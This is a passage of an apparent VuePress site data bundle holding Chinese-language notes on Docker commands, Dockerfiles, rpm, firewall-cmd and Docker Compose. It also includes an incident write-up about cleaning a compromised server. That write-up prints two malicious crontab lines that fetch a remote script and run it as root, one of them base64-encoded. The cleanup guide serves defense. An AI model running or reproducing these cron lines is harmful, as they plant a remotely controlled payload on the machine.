./Dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\n运行容器\n\n#build 构建应用的镜像\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. Docker 使用阿里云仓库或自建仓库\n\n\n# 阿里云仓库\n\n 1. 先登录阿里云镜像服务，地址\n 2. 创建个人或企业实例\n 3. 创建镜像仓库，这个仓库可以建多个，看自己\n 4. 创建完毕之后可以根据阿里云提供的步骤进行推送或拉取\n\n\n\n如果我们只是想用阿里云的镜像加速器，可以找到如下图操作即可。\n\n\n\n\n# 自建仓库\n\n 1. 拉取仓库镜像\n\ndocker pull registry\n\n\n1\n\n 2. 运行镜像\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. 查看镜像信息\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. 上传 DockerHub\n\n 1. 首先保证你登录\n\ndocker login --username=xxxx\n\n\n1\n\n 2. 构建镜像\n\ndocker build -t 账号/应用名称 -f Dockerfile .\n\n\n1\n\n 3. 在 DockerHub 新建仓库 https://hub.docker.com/\n 4. 给镜像打一个 tag 标签\n\ndocker tag 账号/应用名称 账号/标签名称:标签版本\n\n\n1\n\n 5. 上传\n\ndocker push 账号/标签名称:标签版本\n\n\n1\n',normalizedContent:'# 1.docker 的感念，docker 是什么\n\ndocker 分为三种感念：镜像 容器 仓库\n镜像：类似于一个模板，里面包含了一些内容\n容器：容器是一个镜像的实例，如果理解镜像为一个 class，那么容器就被理解为是 new class (); 是镜像的实例\n仓库：就是下载镜像资源的地方。\ndocker 容器不是虚拟机，容器可以说是一个进程，我们可以给容器分配内存。就像 windows 安装了虚拟机，可以给虚拟机分配内存大小，磁盘空间。\n\n\n# 2.docker 基础命令\n\n搜索镜像，从 maven 仓库中查询\n\ndocker search mysql\n\n\n1\n\n\n列出当前系统存在的镜像\n\ndocker images\n\n\n1\n\n\n给镜像更换名称\n\ndocker tag imageid repository:tag\n\n\n1\n\n\n删除镜像 (-f 强制) 必须知道镜像的 imageid\n\ndocker rmi -f imageid\n\n\n1\n\n\nrepository:tag (镜像的仓库源：镜像的标签) 拉取\n\ndocker pull repository:tag\n\n\n1\n\n\n运行一个容器\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * run：运行容器命令\n * -it：运行后直接与终端交互，比如运行 jar 或其他应用的时候 查看他们的启动信息\n * -d：后台运行\n * -p port1:port2：端口映射 port1 (宿主机) port2 (容器) 容器的端口是可以重复的，所以容器和物理机的端口可以一致。rabbitmq 有两个端口 5672 和 15672 所以会用到双 -p repository:tag -> 如果不指定 tag，默认使用最新的\n * --name "xxx"：指定容器名称\n * -v /home/data:/data：/home/data (宿主机):/data (容器) 本地地址和容器地址产生挂载关系， 在容器内部该目录下，或者宿主机内部该目录下，修改文件、创建文件，彼此都会同步修改\n * --restart=always：总是运行，当重启 docker 后会自动运行起来\n * repository:tag：指定运行镜像的名称\n\n查看运行的容器\n\ndocker ps \n\n\n1\n\n\n查看所有状态的容器\n\ndocker ps -a\n\n\n1\n\n\n检查容器内部信息\n\ndocker inspect 容器名称|容器前12位id\n\n\n1\n\n\n停止容器\n\ndocker stop 容器名称|容器前12位id\n\n\n1\n\n\n开启容器运行\n\ndocker start 容器名称\n\n\n1\n\n\n删除容器之前必须先停止容器运行\n\ndocker rm 容器名称\n\n\n1\n\n\n查看容器日志\n\ndokcer logs -f 容器id\n\n\n1\n\n\n进入容器内部\n\ndocker exec -it mysql bash#  进入mysql内部\nmysql -uroot -p123456#  登录mysql服务 注意这里mysql -uroot -p123456 是连起来的\n\n\n1\n2\n\n\n把一个容器制作为一个新的镜像\n\ndocker commit \n -m="提交信息" \n -a="作者" \n 容器id\n 自定义镜像名称:[自定义标签名]\n\n\n1\n2\n3\n4\n5\n\n\n查看容器的信息\n\ndocker inspect 容器id\n\n\n1\n\n\n对于没有私有仓库的要使服务器间共享一个 docker 镜像，可以先把某台机器上的进行先导出，然后其他服务器在导入即可\n\n# 导出\ndocker save \n 镜像id\n -o /本地路径/文件.tar  这句话意思导出到你宿主机的一个地址，文件名随便起后缀为tar，路径要提前建好\n\n# 导入\ndocker load < /上传文件的地址/导出的文件名.tar\n\n# 查看导入的镜像\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n容器之间共享，容器 2 共用 容器 1\n\ndocker tun -it \n  -- name 容器2\n  --volumes-from 容器1(容器1必须已启动)\n  镜像名称\n\n\n1\n2\n3\n4\n\n\n查看制作镜像时叠加其他镜像的操作\n\ndocker history 镜像id\n\n\n1\n\n\n\n# 3. 修改已经存在容器的端口\n\n1、停止容器 (docker stop d00254ce3af7)\n2、停止 docker 服务 (systemctl stop docker)\n3、修改这个容器的 hostconfig.json 文件中的端口（原帖有人提到，如果 config.v2.json 里面也记录了端口，也要修改）\n\ncd /var/lib/docker/containers/d00254ce3af7*    # 这里是container id\n\nvim hostconfig.json\n如果之前没有端口映射, 应该有这样的一段:\n"portbindings":{}\n\n增加一个映射, 这样写:\n"portbindings":{"8080/tcp":[{"hostip":"","hostport":"60000"}]}\n前一个数字是容器端口, 后一个是宿主机端口。将宿主机的60000端口映射到容器的8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4、启动 docker 服务 (systemctl start docker)\n5、启动容器 (docker start d00254ce3af7)\n\n\n# 4. 制作镜像的基本命令\n\n\n# 概念\n\n\n\ndockerfile 默认会把当前所在文件的上下问都发送给 docker server，最终制作成一个镜像，比如你得 dockerfile 在 linux 的根 (/) 目录，那么就会递归根目录下的所有文件，发送到 docker server 制作镜像，所以制作 dockerfile 最好是在某一个地方新建文件夹去制作。制作过程都是依赖于一个个的镜像，所以会有缓存加速下次制作，如果不需要依赖缓存 可以在命令制作的最后面加 --no-cache\n\n.dockerignore 是用来忽略哪些文件或目录不参与到制作镜像中\n\n制作命令： docker build -f /home/docker/nginx/dockerfile . -f 用来指定 dockerfile 所在的位置，一般会使用 docker build -t nginx2 . -t 在当前目录制作镜像， nginx2 镜像的名字， . 代表 dockerfile 就在当前目录\n\n\n# 命令\n\n指令            描述\nfrom          构建的新镜像是基于哪个镜像。例如：from centos:6，第一个指令必须是 from\nmaintainer    镜像维护者姓名或邮箱地址。例如：maintainer mr.chen\nrun           构建镜像时运行的 shell 命令。例如：run ["yum","install","httpd"] 也可以直接 run\n              yum install httpd 或者 run yum install httpd\ncmd           容器运行时执行的shell命令 （编写的 dockerfile 中多个 cmd 都会执行，但默认保留最后一个命令，如果\n              docker run 运行时传递 command，会覆盖 cmd 的保留命令），启动容器会执行 cmd\n              的保留命令。例如：cmd ["-c","/start.sh"] 也可以是 cmd echo \'hello docker\'\nexpose        声明容器运行的服务端口。例如：expose 80 443，但是默认都是 tcp 协议，如果想要暴漏 udp 协议，则是\n              expose 80/udp ，注意只能是 tcp 或 udp\nenv           设置容器内的环境变量。例如：env mysql_root_password 123456\nadd           将宿主机目录下的文件拷贝进镜像且 add 命令会自动处理 url 和解压 tar 包 例如：add\n              ["src","dest"] 或者 add https://xxx.com/html.tar.gz\n              /var/www/html 或者：add html.tar.gz/var/www/html\ncopy          拷贝文件或目录到镜像（不能自动解压缩）。例如：copy ./start.sh/start.sh\nentrypoint    运行容器时执行的 shell 命令（不能被运行时传递的参数覆盖)，比 cmd 牛皮一些。例如：entrypoint\n              ["/bin/bash","-c","/start.sh"] 或者 entrypoint /bin/bash -c\n              "/start.sh"\nvolume        指定容器挂载点到宿主机自动生成的目录或其他容器 例如：volume ["/var/lib/mysql"]\nuser          为 run，cmd 和 entrypoint 执行命令指定运行用户 例如：user mr_chen\nworkdir       指定在创建容器后，终端默认登录进来的工作目录，一个落脚点 例如：workdir /data， 该命令也会影响\n              entrypoint 运行例如jar包时的位置，默认会自带workdir的路径\nhealthcheck   健康检查。例如：healthcheck --interval=5m --timeout=3s --retries=3\n              cmd curl -f http://localhost/ exit 1\narg           在构建镜像时指定一些参数。例如：arg user\nonbuild       当镜像被继承后触发在 onbuild 里写的命令，继承者直接使用 from 命令继承当前镜像的名称即可，在 build\n              的时候触发\n\n提示\n\n从 docker17.05 版本开始，dockerfile 中允许使用多个 from 指令\n\n\n# 配置 idea 连接 docker\n\n配置后方便我们把写好的 docker file 直接打成镜像到 docker 中，方便运行和管理\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1，加载docker守护线程\nsystemctl restart docker // 2，重启docker\n\n\n1\n2\n\n\n\n# 实战构建 springboot 应用\n\n在应用的根目录中创建 dockerfile，具体构建之前一定要了解 springboot 配置文件的加载路径优先级，这里牵扯到我们在修改配置文件时，可以指定挂载外部文件修改后同步到容器，否则，每改一次都要重新制作镜像\n\n提示\n\nspringboot 配置文件的加载路径优先级：\n工程根目录:./config/\n工程根目录：./\nclasspath:/config/\nclasspath:/\n\n# 基础镜像\nfrom openjdk:8-jre-slim\n# 作者\nmaintainer biguncle\n# 配置\nenv params=""\nexpose 8081\n# 时区\nenv tz=asia/shanghai\nrun ln -snf /usr/share/zoneinfo/$tz /etc/localtime && echo $tz > /etc/timezone\n# 添加应用\nadd ./target/tool-boot-0.0.1-snapshot.jar /server/tool-boot.jar\n# 创建一个工作目录，并将外部配置文件复制到镜像中\nrun mkdir /server/config\ncopy /src/main/resources/application.yml /app/config/\nworkdir /server\n## 在镜像运行为容器后执行的命令\nentrypoint java -jar -dpolyglot.engine.warninterpreteronly=false tool-boot.jar  $params\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n执行命令\n\n#build 构建应用的镜像\ndocker build -f ./dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\n运行容器\n\n#build 构建应用的镜像\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. docker 使用阿里云仓库或自建仓库\n\n\n# 阿里云仓库\n\n 1. 先登录阿里云镜像服务，地址\n 2. 创建个人或企业实例\n 3. 创建镜像仓库，这个仓库可以建多个，看自己\n 4. 创建完毕之后可以根据阿里云提供的步骤进行推送或拉取\n\n\n\n如果我们只是想用阿里云的镜像加速器，可以找到如下图操作即可。\n\n\n\n\n# 自建仓库\n\n 1. 拉取仓库镜像\n\ndocker pull registry\n\n\n1\n\n 2. 运行镜像\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. 查看镜像信息\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. 上传 dockerhub\n\n 1. 首先保证你登录\n\ndocker login --username=xxxx\n\n\n1\n\n 2. 构建镜像\n\ndocker build -t 账号/应用名称 -f dockerfile .\n\n\n1\n\n 3. 在 dockerhub 新建仓库 https://hub.docker.com/\n 4. 给镜像打一个 tag 标签\n\ndocker tag 账号/应用名称 账号/标签名称:标签版本\n\n\n1\n\n 5. 上传\n\ndocker push 账号/标签名称:标签版本\n\n\n1\n',charsets:{cjk:!0}},{title:"Linux 22端口对外攻击解决",frontmatter:{title:"Linux 22端口对外攻击解决",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2305",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2305.Linux%2022%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3.html",relativePath:"04.运维/2300.linux/2305.Linux 22端口对外攻击解决.md",key:"v-5108785a",path:"/linux/2305/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'近日同事的服务器遭受到攻击，怀疑是由于上网环境不安全，服务器链接信息被劫持，植入病毒造成服务器告警，告警信息如下：\n\n警告\n\n您的账号（账号 ID: 100016685465，昵称：new）下的设备（IP：121.5.146.143），存在对其他服务器端口（TCP：22）的攻击行为，请您做好安全自查整改，并在 24 小时内停止上述行为。如逾期未处理，我们核实后将按相关法律法规和腾讯云服务协议要求对您停止服务。\n\n从告警信息可以看出是我们的服务器对外发起了攻击，后来对外访问得 22 端口被禁用，缓解了这个问题，但是没有从根本解决，接下来记录一下如何解决问题。首先你看到得自己的服务器状况一定是这样的\n\n\n\n面对进程占用我们可以 kill 掉，但还是会被重新启动，所以这种情况先检查是否有定时任务\n\n# 显示 crontab 任务。 \ncrontab -l \n# 如果有非法定时任务删除他 \ncrontab -r 任务\n\n\n1\n2\n3\n4\n\n\n但是我查看后同事的服务没有任何定时文件在执行，那我们需要查看 /etc/crontab 是否有非法定时任务\n\n* * * * * root echo Y3VybCAtZnNTTCBodHRwOi8vMTQwLjk5LjMyLjQ4L2IyZjYyOC9jcm9uYi5zaAo=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\n以上内容可以看到有两个定时任务一直再跑，其中一个一直在下载文件并且执行，此时我们干掉这两个任务，我在注掉这两个任务提示我\n\n注意\n\n/etc/crontab" E514: write error (file system full?) 系统文件已满\n\n此时需要删除一些文件释放空间以对以上内容进行保存\n\n# 查看哪个文件占用较大可以删掉\ndu -sh 文件\n\n\n1\n2\n\n\n以上完成后，重新启动定时任务\n\nsystemctl restart crond.service\n\n\n1\n\n\n找到进程所在文件，删除文件，停止进程\n\nps -ef | grep 18732\n\n\n1\n\n\n以上操作下来如果还有问题，那么可能需要排查所运行的服务是否有异常，比如 docker 是否有重复容器被启动等',normalizedContent:'近日同事的服务器遭受到攻击，怀疑是由于上网环境不安全，服务器链接信息被劫持，植入病毒造成服务器告警，告警信息如下：\n\n警告\n\n您的账号（账号 id: 100016685465，昵称：new）下的设备（ip：121.5.146.143），存在对其他服务器端口（tcp：22）的攻击行为，请您做好安全自查整改，并在 24 小时内停止上述行为。如逾期未处理，我们核实后将按相关法律法规和腾讯云服务协议要求对您停止服务。\n\n从告警信息可以看出是我们的服务器对外发起了攻击，后来对外访问得 22 端口被禁用，缓解了这个问题，但是没有从根本解决，接下来记录一下如何解决问题。首先你看到得自己的服务器状况一定是这样的\n\n\n\n面对进程占用我们可以 kill 掉，但还是会被重新启动，所以这种情况先检查是否有定时任务\n\n# 显示 crontab 任务。 \ncrontab -l \n# 如果有非法定时任务删除他 \ncrontab -r 任务\n\n\n1\n2\n3\n4\n\n\n但是我查看后同事的服务没有任何定时文件在执行，那我们需要查看 /etc/crontab 是否有非法定时任务\n\n* * * * * root echo y3vybcatznnttcbodhrwoi8vmtqwljk5ljmyljq4l2iyzjyyoc9jcm9uyi5zaao=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\n以上内容可以看到有两个定时任务一直再跑，其中一个一直在下载文件并且执行，此时我们干掉这两个任务，我在注掉这两个任务提示我\n\n注意\n\n/etc/crontab" e514: write error (file system full?) 系统文件已满\n\n此时需要删除一些文件释放空间以对以上内容进行保存\n\n# 查看哪个文件占用较大可以删掉\ndu -sh 文件\n\n\n1\n2\n\n\n以上完成后，重新启动定时任务\n\nsystemctl restart crond.service\n\n\n1\n\n\n找到进程所在文件，删除文件，停止进程\n\nps -ef | grep 18732\n\n\n1\n\n\n以上操作下来如果还有问题，那么可能需要排查所运行的服务是否有异常，比如 docker 是否有重复容器被启动等',charsets:{cjk:!0}},{title:"Linux 命令总结",frontmatter:{title:"Linux 命令总结",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2304",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2304.Linux%20%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93.html",relativePath:"04.运维/2300.linux/2304.Linux 命令总结.md",key:"v-52c117a4",path:"/linux/2304/",headers:[{level:2,title:"rpm",slug:"rpm",normalizedTitle:"rpm",charIndex:2},{level:2,title:"firewall",slug:"firewall",normalizedTitle:"firewall",charIndex:330}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"rpm firewall",content:'# rpm\n\n在 Linux 系统中，RPM（Red Hat Package Manager）是一种常见的软件包管理器，提供了方便的软件安装、升级和卸载功能。本文将详细介绍 rpm 的语法、实操和各种方法之间的区别及重点内容。\n\n# 安装\nrpm -ivh xxx.rpm\n\n# 可以查询到rpm包的名字\nrpm -q <关键字>\n\n# 删除特定rpm包\nrpm -e <包的名字>\n\n# 不检查依赖，直接删除rpm包\nrpm -e --nodeps <包的名字>\n\n# 删除所有相同名字的包， 并忽略依赖\nrpm -e --allmatches --nodeps <包的名字>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall 是 CentOS 7 版本后的自带防火墙管理工具，与 iptables 不同，firewall 是一款动态防火墙管理工具。所谓动态防火墙，是指 firewall 在运行时，任何规则的变更都不需要对防火墙规则列表进行重新加载，只需要将变更部分保存并更新运行即可。相对应的，当用户使用 iptables 添加规则时，如果想要让规则永久保存，需要执行命令 serivce iptables save（注：该命令的执行需要安装 iptables.serivces），才可以永久保存置配置文件中，并且在重启后，配置依旧存在。在整个过程中，iptables 会对防火墙的规则列表重读一遍，加载到内核。\n\n添加范围端口 如 5000-10000：\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\n重新载入\n\nfirewall-cmd --reload\n\n\n1\n\n\n查看\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\n删除\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# 但如果你需要开启 firewalld，那么请查看如下配置\n# 允许22端口访问\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# 重新载入一下防火墙设置，使设置生效\nfirewall-cmd --reload\n# 可通过如下命令查看是否生效\nfirewall-cmd --zone=public --query-port=22/tcp\n# 查看当前系统打开的所有端口\nfirewall-cmd --zone=public --list-ports\n# 关掉刚刚打开的22端口\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# 批量开放端口，如从100到500这之间的端口我们全部要打开\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# 限制IP为192.168.0.200的地址禁止访问80端口即禁止访问机器\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# 解除刚才被限制的192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# 限制10.0.0.0-10.0.0.255这一整个段的IP，禁止他们访问\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'# rpm\n\n在 linux 系统中，rpm（red hat package manager）是一种常见的软件包管理器，提供了方便的软件安装、升级和卸载功能。本文将详细介绍 rpm 的语法、实操和各种方法之间的区别及重点内容。\n\n# 安装\nrpm -ivh xxx.rpm\n\n# 可以查询到rpm包的名字\nrpm -q <关键字>\n\n# 删除特定rpm包\nrpm -e <包的名字>\n\n# 不检查依赖，直接删除rpm包\nrpm -e --nodeps <包的名字>\n\n# 删除所有相同名字的包， 并忽略依赖\nrpm -e --allmatches --nodeps <包的名字>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall 是 centos 7 版本后的自带防火墙管理工具，与 iptables 不同，firewall 是一款动态防火墙管理工具。所谓动态防火墙，是指 firewall 在运行时，任何规则的变更都不需要对防火墙规则列表进行重新加载，只需要将变更部分保存并更新运行即可。相对应的，当用户使用 iptables 添加规则时，如果想要让规则永久保存，需要执行命令 serivce iptables save（注：该命令的执行需要安装 iptables.serivces），才可以永久保存置配置文件中，并且在重启后，配置依旧存在。在整个过程中，iptables 会对防火墙的规则列表重读一遍，加载到内核。\n\n添加范围端口 如 5000-10000：\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\n重新载入\n\nfirewall-cmd --reload\n\n\n1\n\n\n查看\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\n删除\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# 但如果你需要开启 firewalld，那么请查看如下配置\n# 允许22端口访问\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# 重新载入一下防火墙设置，使设置生效\nfirewall-cmd --reload\n# 可通过如下命令查看是否生效\nfirewall-cmd --zone=public --query-port=22/tcp\n# 查看当前系统打开的所有端口\nfirewall-cmd --zone=public --list-ports\n# 关掉刚刚打开的22端口\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# 批量开放端口，如从100到500这之间的端口我们全部要打开\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# 限制ip为192.168.0.200的地址禁止访问80端口即禁止访问机器\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# 解除刚才被限制的192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# 限制10.0.0.0-10.0.0.255这一整个段的ip，禁止他们访问\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"Docker-Compose 命令及基本使用",frontmatter:{title:"Docker-Compose 命令及基本使用",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/401",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/40.Docker/401.Docker-Compose%20%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html",relativePath:"04.运维/40.Docker/401.Docker-Compose 命令及基本使用.md",key:"v-5e7029de",path:"/docker/401/",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:2},{level:2,title:"安装与卸载",slug:"安装与卸载",normalizedTitle:"安装与卸载",charIndex:638},{level:2,title:"命令",slug:"命令",normalizedTitle:"命令",charIndex:503},{level:2,title:"Compose文件编写",slug:"compose文件编写",normalizedTitle:"compose 文件编写",charIndex:1790},{level:3,title:"示例1",slug:"示例1",normalizedTitle:"示例 1",charIndex:1807},{level:3,title:"示例2",slug:"示例2",normalizedTitle:"示例 2",charIndex:3203},{level:3,title:"Compose 指令",slug:"compose-指令",normalizedTitle:"compose 指令",charIndex:5784},{level:3,title:"命令选项",slug:"命令选项",normalizedTitle:"命令选项",charIndex:5952},{level:3,title:"命令使用说明",slug:"命令使用说明",normalizedTitle:"命令使用说明",charIndex:6176},{level:4,title:"up",slug:"up",normalizedTitle:"up",charIndex:2309},{level:4,title:"down",slug:"down",normalizedTitle:"down",charIndex:809},{level:4,title:"exec",slug:"exec",normalizedTitle:"exec",charIndex:6686},{level:4,title:"ps",slug:"ps",normalizedTitle:"ps",charIndex:769},{level:4,title:"restart",slug:"restart",normalizedTitle:"restart",charIndex:6824},{level:4,title:"rm",slug:"rm",normalizedTitle:"rm",charIndex:6925},{level:4,title:"start",slug:"start",normalizedTitle:"start",charIndex:6826},{level:4,title:"stop",slug:"stop",normalizedTitle:"stop",charIndex:7013},{level:4,title:"top",slug:"top",normalizedTitle:"top",charIndex:666},{level:4,title:"pause,unpause",slug:"pause-unpause",normalizedTitle:"pause,unpause",charIndex:7337},{level:4,title:"logs",slug:"logs",normalizedTitle:"logs",charIndex:7464}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"简介 安装与卸载 命令 Compose文件编写 示例1 示例2 Compose 指令 命令选项 命令使用说明 up down exec ps restart rm start stop top pause,unpause logs",content:'# 简介\n\nCompose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排，帮助定义和运行多个 Docker 容器的应用，其前身是开源项目 Fig。所谓编排就是能把一个项目的依赖（如 mysql，redis，服务间的依赖等）按照有序的方式启动容器\n\nDockerFile 可以让用户很方便的定义一个单独的应用容器，然而在日常工作中们经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 web 项目，除了 web 服务容器本身，往往还需要再加上后端的数据库服务器容器，甚至还包括负载均衡容器等。\n\nCompose 恰好满足了这样的需求，它允许通过一个单独的 docker-compose.yml 模板文件，来定义一组相关联的应用容器为一个项目。\n\nCompose 中有两个重要的概念\n\n 1. 服务（service），一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。\n 2. 项目（project），由一组关联的应用容器组成的一个完整业务单元，再 docker-compose.yml 文件中定义。\n\nCompose 的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷地生命周期管理。\n\nCompose 项目由 Python 编写，实现上调用了 Docker 服务提供的 API 来对容器进行管理。因此，只要所操作的平台支持 Docker API，就可以再其上利用 Compose 来进行编排管理。\n\n\n# 安装与卸载\n\n安装的话，可以安装 Docker Desktop ，它包含了 Docker 以及 Compose 和 K8s，也可以单独安装，但建议先了解清楚官方对 Compose 的一些安装限制。官方地址\n\nlinux 安装\n\nsudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# 命令\n\n命令            描述\nversion       版本目前 4 以下的都可以写，如 3.9，3.8 等，最好保持和 docker 版本兼容\nservices      可以里面描述你的所有服务，以及依赖关系等\nimage         指定为镜像名称或镜像 ID，如果镜像在本地不存在，Compose 将会尝试拉取这个镜像\nports         指定与宿主机与容器映射的端口，是一个数组，每个数组的元素建议用字符形式，如 "80:80"\nvolumes       挂载路径设置，类型为数组，可以挂载多个，在制作容器的时候可以显示的声明挂载路径，也可以在容器运行时直接使用 -v 命令。\nnetworks      配置容器连接的网络 docker network ls 查看网络列表， docker network inspect\n              <container id> 可以查看对应网络的配置\nenvironment   设置环境变量。你可以使用数组或字典两种方式\nenv_file      从文件中获取环境变量，可以为单独的文件路径或列表，文件内必须是字典方式编写\ncommand       覆盖容器启动后默认执行的命令\ndepends_on    解决容器的依赖、启动先后的问题，填写的值为 服务名，会等依赖的服务启动一定程度才启动自己\nhealthcheck   通过命令检查容器是否监控运行\nsysctls       配置容器内核参数，如 ES 等都需要修改内核的环境参数\nulimits       指定容器的 ulimits 限制值，如 ES、Clickhouse 会有修改需求\nbuild         用来将指定 Dockerfile 打包成对应镜像，然后再运行该镜像\n\n这些命令其实就类似于我们在 Docker 中启动一个容器的命令。\n\n\n# Compose 文件编写\n\n\n# 示例 1\n\n### 版本\nversion: "3.2"\n\nservices:\n  ### 服务名称\n  tomcat:\n    ### 指定容器的名称 相当于 --name\n    container_name: tomcat_1\n    ### 使用哪个镜像 相当于 docket run image\n    image: tomcat:8.0-jre8\n    ### 指定宿主机与容器端口的映射 相当于 -p\n    ports:\n      ### 宿主机:容器\n      - "8080:8080"\n    ### 宿主机与容器的数据共享 挂载目录 相当于 -v\n    volumes:\n      ### 方式1：指定绝对明确(绝对路径)的挂载目录\n      - /home/server:/user\n      ### 方式2：声明了自定创建卷名的变量\n      - tomcatwebapps:/user\n    ### 代表当前服务处于那个网络，作用是网络隔离用，会把相网络名称相同的容器的网段统一。相当于 --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -MYSQL_ROOT_PASSWORD=root\n    networks:\n      group1\n\n\n### 描述 挂在卷里的变量\nvolumes:\n  ### 指定变量 tomcatwebapps，如果不写 external，默认会是 docker-compose.yml 所在当前文件夹的名称(会自动创建)\n  tomcatwebapps:\n    ### 使用自定义卷毛\n    external:\n      ### true 确定使用指定卷名，注意：一旦使用外部自定义卷名，启动服务之前必须手动创建 docker volume create 卷名\n      false\n  mysqldata:\n  mysqlconf:\n\n### 定义服务用到的网络\nnetworks:\n  ### 定义上面的服务用到的网络的名称，默认是驱动属于 bridge，自定义的网络名称 group1，在实际中会变为 项目名(或所在文件目录名)\n  group1:\n    ### 使用外部指定的网络，为 true 就标识网络必须存在\n    external:\n      ### docker network create -d bridge 网络名称\n      true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# 示例 2\n\n### 指定版本，版本的关系和Docker 引擎有关\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles 版本关系及说明\nversion: \'3.7\'\n\n### 指定服务\nservices:\n  